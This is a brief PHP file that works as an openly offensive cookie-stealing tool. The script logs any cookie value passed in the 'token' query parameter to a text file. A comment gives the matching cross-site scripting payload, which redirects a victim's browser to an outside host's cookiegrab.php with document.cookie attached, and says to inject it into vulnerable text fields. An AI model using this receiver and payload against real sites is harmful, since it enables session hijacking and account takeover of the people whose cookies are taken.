<?php

	$cookie = $_GET["token"];
	$file = fopen('cookielog.txt', 'a');
	fwrite($file, $cookie . "\n\n");
	/* 
	inject 
	<script language="javascript"> document.location= " http://kennethzhang.net/cookiegrab.php?c=" + document.cookie; </script>
	into vulnerable text fields
	*/
?> 
